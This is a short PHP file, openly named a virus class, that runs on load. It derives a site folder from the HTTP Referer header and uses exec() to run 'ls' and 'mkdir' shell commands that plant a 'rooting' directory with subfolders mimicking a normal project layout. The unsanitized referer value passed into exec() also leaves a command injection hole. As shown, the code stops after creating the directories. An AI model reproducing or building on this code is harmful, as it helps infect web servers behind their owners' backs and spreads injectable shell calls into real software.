<?php

$data = new Virus();
$data->infect_structure_dir();


Class Virus {

	/**
	 * @link_index String
	 */
	private $link_index;

	/**
	 * @link_root String
	 */
	private $link_root;

	/**
	 * @struct_dir Array
	 */
	private $struct_dir = ["class", "css", "js", "modules", "require", "template"];

	/**
	 * @struct_file Array
	 */
	private $struct_file = [];

	const DIR_VIRUS = "rooting";

	public function __Construct() {

		$link_explode = explode('/', $_SERVER['HTTP_REFERER']);
		$this->link_index = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/index.php';
		$this->link_root = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/';
	}

	public function infect_structure_dir() {

		exec("ls -l ".$this->link_root.self::DIR_VIRUS, $exist_directory);

		if (empty($exist_directory)) {

			exec("mkdir ".$this->link_root.self::DIR_VIRUS);

			foreach ($this->struct_dir as $value) {

				exec("mkdir ".$this->link_root.self::DIR_VIRUS.'/'.$value);
			}
		}
	}
}
?>